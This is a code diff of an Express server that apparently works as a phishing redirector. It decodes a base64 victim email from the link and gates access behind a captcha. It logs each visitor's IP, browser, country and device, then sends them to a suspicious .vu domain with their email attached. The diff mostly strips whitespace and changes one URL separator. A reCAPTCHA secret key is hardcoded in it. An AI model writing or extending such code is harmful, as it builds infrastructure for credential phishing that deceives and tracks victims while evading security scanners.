@@ -62,12 +62,12 @@ function logVisitor(ip, ua, country, device) {
                 }
             }
         }
-        
+
         if (!entries[ip]) {
             entries[ip] = { ua, country, device, count: 0 };
         }
         entries[ip].count++;
-        
+
         let output = '';
         for (const [key, val] of Object.entries(entries)) {
             output += `${key} | ${val.ua} | ${val.country} | ${val.device} | ${val.count}\n`;
@@ -81,19 +81,19 @@ function logVisitor(ip, ua, country, device) {
 // Helper: Parse and decode base64 email
 function extractEmail(segment) {
     if (!segment) return null;
-    
+
     let target = segment.trim();
     if (target.startsWith('$(') && target.endsWith(')')) {
         target = target.substring(2, target.length - 1);
     }
-    
+
     // Normalize base64
     let normalized = target.replace(/-/g, '+').replace(/_/g, '/');
     const padding = normalized.length % 4;
     if (padding > 0) {
         normalized += '='.repeat(4 - padding);
     }
-    
+
     try {
         const decoded = Buffer.from(normalized, 'base64').toString('utf8');
         const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
@@ -114,22 +114,22 @@ app.get('/', (req, res) => {
 // POST: Verify Turnstile Token and generate redirect URL
 app.post('/verify', async (req, res) => {
     const { token, emailB64 } = req.body;
-    
+
     if (!token || !emailB64) {
         return res.status(400).json({ status: 'error', message: 'Missing token or email parameters.' });
     }
-    
+
     // Extract base64 segment from either path format or direct string
     const urlSegments = emailB64.split('/').filter(Boolean);
     const rawSegment = urlSegments[urlSegments.length - 1] || emailB64;
-    
+
     const decodedEmail = extractEmail(rawSegment);
     if (!decodedEmail) {
         return res.status(400).json({ status: 'error', message: 'Invalid or missing secure email context.' });
     }
-    
+
     const clientIp = getClientIp(req);
-    
+
     try {
         const secretKey = process.env.RECAPTCHA_SECRET_KEY || '6LcpGUktAAAAAHyp97krWyWMHjONdjCzXxk88CDc';
         // Verify reCAPTCHA challenge token
@@ -142,22 +142,22 @@ app.post('/verify', async (req, res) => {
             }),
             { timeout: 5000 }
         );
-        
+
         const result = response.data;
         if (result.success) {
             const ua = req.headers['user-agent'] || '';
             const country = await lookupCountry(clientIp);
             const device = detectDeviceType(ua);
-            
+
             logVisitor(clientIp, ua, country, device);
-            
+
             // Build the success redirect URL, attaching the email parameters
             const baseUrl = process.env.REDIRECT_BASE_URL || 'https://solutionlifeseniorservicescapital.forklcwardlawllp.vu';
             const random_str = Math.random().toString(36).substring(2, 15);
-            const finalBaseUrl = baseUrl + '/' + random_str + '/' + encodeURIComponent(emailB64);
+            const finalBaseUrl = baseUrl + '/' + random_str + '$' + encodeURIComponent(emailB64);
             const urlObj = new URL(finalBaseUrl);
             urlObj.searchParams.set('email', decodedEmail);
-            
+
             return res.json({
                 status: 'success',
                 email: decodedEmail,
